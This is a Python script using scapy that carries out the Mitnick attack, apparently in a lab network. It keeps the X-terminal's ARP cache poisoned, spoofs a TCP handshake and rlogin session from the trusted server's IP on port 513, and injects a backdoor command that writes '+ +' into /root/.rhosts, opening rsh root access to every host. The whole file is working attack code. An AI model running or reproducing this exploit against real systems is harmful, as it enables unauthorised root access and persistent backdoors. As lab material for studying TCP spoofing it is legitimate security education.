from threading import Thread
from time import sleep
import scapy.all as scapy
import os

SPOOF_DELAY = 2

TARGET_PORT = 513
SOURCE_PORT = 1023

INITIAL_SEQUENCE_NUMBER = 1000

X_TERMINAL_IP     = '10.9.0.5'
TRUSTED_SERVER_IP = '10.9.0.6'

SYN_FLAG     = 'S'
SYN_ACK_FLAG = 'SA'
ACK_FLAG     = 'A'
PSH_ACK_FLAG = 'PA'

ZERO_BYTE       = b'\x00'
CLIENT_USERNAME = "root"
SERVER_USERNAME = "root"
TERMINAL_INFO   = "xterm/38400"

BACKDOOR_COMMAND = 'echo "+ +" >> /root/.rhosts\r'

# Broadcast with who-has operation to poison arp table. It tells that the trusted-server's ip is located at the attacker's mac address.
def spoof(): 
  packet = scapy.ARP(op=1, 
                     pdst=X_TERMINAL_IP,
                     psrc=TRUSTED_SERVER_IP)
  scapy.send(packet, verbose=False)

# Infinite loop with a little delay to keep arp table poisoned.
def spoof_loop():
  global stop_spoofing

  while not stop_spoofing:
    spoof()
    sleep(SPOOF_DELAY)

def disable_ip_forward(): 
  os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def setup_attacker_env():
  print("   Disabling ip forward...")
  disable_ip_forward()
  print("   Ip forward disabled!")

if __name__ == "__main__":
  print('Setting up attacker environment...')
  setup_attacker_env()
  print('Attacker environment configured!\n')

  stop_spoofing = False

  spoof_thread = Thread(target=spoof_loop)
  spoof_thread.start()
  
  # Ensure that the arp table is poisoned
  spoof()

  # Step 1: Send SYN packet
  syn_packet     = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP) / scapy.TCP(sport=SOURCE_PORT, dport=TARGET_PORT, flags=SYN_FLAG, seq=INITIAL_SEQUENCE_NUMBER)
  syn_ack_packet = scapy.sr1(syn_packet, timeout=1, verbose=False)
  print(f"SYN packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")
  if syn_ack_packet and syn_ack_packet.haslayer(scapy.TCP) and syn_ack_packet[scapy.TCP].flags == SYN_ACK_FLAG:
    print(f"Received SYN-ACK packet from {X_TERMINAL_IP}:{TARGET_PORT}")

    # Step 2: Send ACK packet
    ack_packet = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP) / scapy.TCP(sport=SOURCE_PORT, dport=TARGET_PORT, flags=ACK_FLAG, seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1)
    scapy.send(ack_packet, verbose=False)
    print(f"ACK packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")

    # At this point, the TCP three-way handshake is complete
    print("\nTCP three-way handshake completed successfully!\n")

    # Step 3: Send rlogin packet
    rlogin_packet_payload  = ZERO_BYTE + CLIENT_USERNAME.encode() + ZERO_BYTE + SERVER_USERNAME.encode() + ZERO_BYTE + TERMINAL_INFO.encode() + ZERO_BYTE
    rlogin_packet          = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP) / scapy.TCP(sport=SOURCE_PORT, dport=TARGET_PORT, flags=PSH_ACK_FLAG, seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1) / scapy.Raw(load=rlogin_packet_payload)
    rlogin_response_packet = scapy.sr1(rlogin_packet, timeout=1, verbose=False)
    print(f"rlogin packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")

    if rlogin_response_packet and rlogin_response_packet.haslayer(scapy.TCP) and rlogin_response_packet[scapy.TCP].flags == "A" and rlogin_response_packet.haslayer(scapy.Raw) == 0:
      print("\nrlogin connection established successfully!\n")

      # Step 4: Send backdoor packet. Make xterminal accept remote access to any host
      backdoor_packet_payload = BACKDOOR_COMMAND.encode()
      backdoor_packet         = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP) / scapy.TCP(sport=SOURCE_PORT, dport=TARGET_PORT, flags=PSH_ACK_FLAG, seq=rlogin_response_packet.ack, ack=rlogin_response_packet.seq + 1) / scapy.Raw(load=backdoor_packet_payload)
      scapy.send(backdoor_packet, verbose=False)

      print(f"Backdoor packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")
    else: 
      print("Failed to establish rlogin connection.")
  else:
    print("Handshake failed.")

  print(f"\nAt this point, you may have remote access via rsh with xterminal. When this script stops running, just type on terminal the following command: rsh {X_TERMINAL_IP}. Bye bye :)")

  stop_spoofing = True

  spoof_thread.join()
